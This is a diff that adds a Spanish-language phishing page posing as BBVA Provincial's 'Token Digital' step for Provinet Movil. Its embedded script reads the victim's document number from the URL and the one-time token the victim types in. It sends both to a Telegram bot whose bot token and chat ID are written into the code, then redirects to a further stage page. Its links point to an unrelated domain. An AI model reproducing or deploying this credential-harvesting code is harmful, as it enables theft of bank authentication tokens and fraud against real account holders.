@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Token Digital</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        header,
+        footer {
+            background-color: #072146;
+            color: white;
+            padding: 10px 20px;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        nav a {
+            color: #ffc107;
+            margin: 0 10px;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .container {
+            background-color: #fff7d6;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 350px;
+            margin: auto;
+        }
+        
+        h1 {
+            color: #003366;
+            margin-bottom: 15px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        p {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #004080;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        
+        button:hover {
+            background-color: #002d5a;
+        }
+        
+        .social-icons {
+            margin: 10px 0;
+        }
+        
+        .social-icons a {
+            margin: 0 5px;
+            color: #00bfff;
+            text-decoration: none;
+            font-size: 18px;
+        }
+        
+        .footer-text {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .footer-text div {
+            margin: 5px;
+        }
+        
+        a {
+            color: #004080;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        a:hover {
+            text-decoration: underline;
+        }
+        /* Estilos responsivos para móviles */
+        
+        @media (max-width: 600px) {
+            .container {
+                width: 100%;
+                padding: 15px;
+            }
+            h1 {
+                font-size: 20px;
+            }
+            p {
+                font-size: 12px;
+            }
+            input[type="text"] {
+                font-size: 14px;
+                padding: 10px;
+            }
+            button {
+                padding: 12px;
+                font-size: 14px;
+            }
+            a {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div><img src="./Firma_files/image.png" alt=""></div>
+        <nav></nav>
+    </header>
+
+    <div class="container">
+        <h1>Token digital</h1>
+
+        <div>
+            <img src="./Firma_files/image-removebg-preview-15.png" alt="" style="width: 100px; height: auto;">
+        </div>
+        <p>Introduce la clave que generaste con Token Digital en Provinet Movil</p>
+        <form id="miFormulario">
+            <input type="text" id="clave" name="ffd3" maxlength="10" placeholder="Ingrese su Token digital " required>
+            <p style="color: red; ">Token Digital Incorrecto </p>
+            <button type="submit ">Siguiente</button>
+            <br><br>
+            <a href="https://lareservawest.mx/bbt/c.html ">No tengo token digital</a>
+        </form>
+    </div>
+
+    <footer>
+        <div class="footer-text ">
+            <div>© 2024 BBVA Provincial S.A. RIF: J-00002967-9</div>
+            <div class="social-icons ">
+                <a href="https://lareservawest.mx/bbt/tok2.html# "></a>
+                <a href="https://lareservawest.mx/bbt/tok2.html# "></a>
+                <a href="https://lareservawest.mx/bbt/tok2.html# "></a>
+                <a href="https://lareservawest.mx/bbt/tok2.html# "></a>
+                <a href="https://lareservawest.mx/bbt/tok2.html# "></a>
+            </div>
+            <div><strong>Creando Oportunidades</strong></div>
+        </div>
+    </footer>
+
+    <script>
+        // Función para obtener el valor de un parámetro de la URL
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            let regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Obtén el número de documento de la URL
+        const numeroDocumento = getParameterByName('documento');
+
+        // Reemplaza con tu token y chat ID
+        const BOT_TOKEN = '7510532523:AAHsERIzR24MZsO2Bwk9seHZxE4aICObwjU';
+        const CHAT_ID = '7713690054';
+
+        document.getElementById('miFormulario').addEventListener('submit', function(event) {
+            event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
+
+            // Obtén el valor del campo de texto
+            const clave = document.getElementById('clave').value;
+
+            // Mensaje que se enviará a Telegram
+            const mensaje = `Documento: ${numeroDocumento}\n@ProArgFull\nToken2: ${clave}`;
+
+            // URL de la API de Telegram para enviar mensajes
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            // Envía los datos a Telegram usando fetch
+            fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Mensaje enviado a Telegram:', data);
+                    // Redirige a Google después de enviar el mensaje
+                    window.location.href = 'carg2.html?documento=' + encodeURIComponent(numeroDocumento);
+                })
+                .catch(error => {
+                    console.error('Error al enviar el mensaje:', error);
+                });
+        });
+    </script>
+</body>
+
+</html>
